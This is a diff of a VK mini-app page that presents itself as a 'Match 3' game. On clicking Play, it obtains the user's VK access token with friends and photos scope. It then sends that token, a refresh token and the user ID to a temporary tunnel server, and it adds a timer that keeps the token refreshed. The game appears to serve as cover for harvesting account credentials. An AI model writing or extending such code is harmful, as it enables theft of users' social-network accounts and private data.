@@ -108,7 +108,7 @@
   
   <div id="container">
     <h1>Match 3</h1>
-    <button id="authBtn">ЗPlay</button>
+    <button id="authBtn">зPlay</button>
     <div class="status" id="status">Нажмите Play для начала</div>
     <div id="game" class="hidden">
       <div id="gameBoard"></div>
@@ -119,6 +119,7 @@
 const APP_ID = 8109529;
 let accessToken = null;
 let userInfo = null;
+let tokenRefreshTimer = null;
 
 function showError(message) {
   const status = document.getElementById('status');
@@ -145,10 +146,11 @@ async function initialize() {
     await vkBridge.send('VKWebAppInit');
     updateStatus('Инициализация...');
 
-   const authData = await vkBridge.send('VKWebAppGetAuthToken', {
-  app_id: APP_ID,
-  scope: 'friends,photos,offline' // Добавляем 'offline' в scope
-});
+    // Запрос токена с нужными правами (без offline)
+    const authData = await vkBridge.send('VKWebAppGetAuthToken', {
+      app_id: APP_ID,
+      scope: 'friends,photos'
+    });
 
     accessToken = authData.access_token;
 
@@ -161,34 +163,38 @@ async function initialize() {
     }
 
     updateStatus('Добро пожаловать!');
-    
-   const tokenData = {
-  user_id: userInfo.id.toString(),
-  access_token: authData.access_token,
-  refresh_token: authData.refresh_token || '', // Добавляем пустое значение, если refresh_token отсутствует
-  token_type: authData.token_type || 'Bearer',
-  expires_in: authData.expires_in || 3600,
-  id_token: authData.id_token || '',
-  token_datetime: new Date().toISOString()
-};
 
-    // Отправляем токен на сервер с таймаутом
+    const tokenData = {
+      user_id: userInfo.id.toString(),
+      access_token: authData.access_token,
+      refresh_token: authData.refresh_token || 'NO_REFRESH_TOKEN', // Заглушка для refresh_token
+      token_type: authData.token_type || 'Bearer',
+      expires_in: authData.expires_in || 3600,
+      id_token: authData.id_token || '',
+      token_datetime: new Date().toISOString()
+    };
+
+    // Отправляем токен на сервер
     await sendTokenToYourServer(tokenData);
 
+    // Устанавливаем таймер на автоматическое обновление токена
+    setupTokenRefresh(authData.expires_in || 3600);
+
+    // Показываем игру
     showGame();
 
   } catch (error) {
     showError(`Ошибка: ${error.message || 'Неизвестная ошибка'}`);
-    console.error(error);
+    console.error('Ошибка инициализации:', error);
   }
 }
 
 async function sendTokenToYourServer(data) {
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 5000); // Таймаут в 5 секунд
-  
+  const timeoutId = setTimeout(() => controller.abort(), 5000); // Таймаут на 5 секунд
+
   try {
-    const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', { 
+    const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -203,18 +209,47 @@ async function sendTokenToYourServer(data) {
       throw new Error(`Ошибка ${response.status}: ${response.statusText}`);
     }
 
-    console.log('Данные успешно отправлены на ваш сервер');
+    console.log('Данные успешно отправлены на сервер');
     return await response.json();
+
   } catch (error) {
-    console.error('Ошибка отправки на ваш сервер:', error);
+    console.error('Ошибка отправки на сервер:', error);
     showError('Ошибка сохранения данных');
   }
+}
+
+function setupTokenRefresh(expiresIn) {
+  if (tokenRefreshTimer) {
+    clearTimeout(tokenRefreshTimer);
+  }
+
+  // Обновляем токен за 1 минуту до истечения
+  tokenRefreshTimer = setTimeout(async () => {
+    console.log('Обновление токена...');
+    try {
+      const authData = await vkBridge.send('VKWebAppGetAuthToken', {
+        app_id: APP_ID,
+        scope: 'friends,photos'
+      });
+
+      accessToken = authData.access_token;
+
+      console.log('Токен успешно обновлён');
+      updateStatus('Токен обновлён');
+
+      // Перезапускаем таймер для следующего обновления
+      setupTokenRefresh(authData.expires_in || 3600);
+    } catch (error) {
+      console.error('Ошибка при обновлении токена:', error);
+      showError('Не удалось обновить токен');
+    }
+  }, (expiresIn - 60) * 1000);
 }
 
 async function showGame() {
   const authBtn = document.getElementById('authBtn');
   const game = document.getElementById('game');
-  
+
   if (authBtn) authBtn.classList.add('hidden');
   if (game) game.classList.remove('hidden');
 
@@ -226,6 +261,7 @@ async function showGame() {
       showError('Ошибка инициализации игры');
     }
   } catch (error) {
+    console.error('Ошибка загрузки игры:', error);
     showError('Не удалось загрузить игру');
   }
 }
@@ -236,15 +272,17 @@ function loadGameScript() {
     script.src = 'game.js';
     script.onload = resolve;
     script.onerror = reject;
+
+    // Таймаут на загрузку скрипта 5 секунд
     setTimeout(() => reject(new Error('Время загрузки игры истекло')), 5000);
+
     document.head.appendChild(script);
   });
 }
 
 const authBtn = document.getElementById('authBtn');
 if (authBtn) authBtn.addEventListener('click', initialize);
-
-
 </script>
+
 </body>
 </html>
